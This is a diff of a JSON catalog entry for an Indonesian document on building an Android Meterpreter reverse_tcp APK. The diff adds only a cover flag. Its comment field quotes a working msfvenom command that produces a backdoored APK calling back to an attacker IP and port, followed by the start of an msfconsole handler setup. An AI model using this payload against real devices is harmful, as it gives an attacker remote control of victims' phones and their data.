@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/11624?v=1795440346",
   "cover_og_url": "/cover/11624/og?v=1795440346",
+  "has_cover": false,
   "url": "/book/msf-android-meterpreter-reverse-tcp-apk-dengan-msfvenom-onno-widodo-purbo/",
   "rating": null,
   "comment": "sumber: https://null-byte.wonderhowto.com/forum/create-and-use-android-meterpreter-reverse-tcp-apk-with-msfvenom-0162921/ Membuat apk dengan msfvenom msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.209 LPORT=443 &gt; hack.apk Asumsi IP attacker (kali linux) 192.168.0.209 port attacker 443 Di sisi attacker / kali linux msfconsole use exploit/multi/handler set payload",
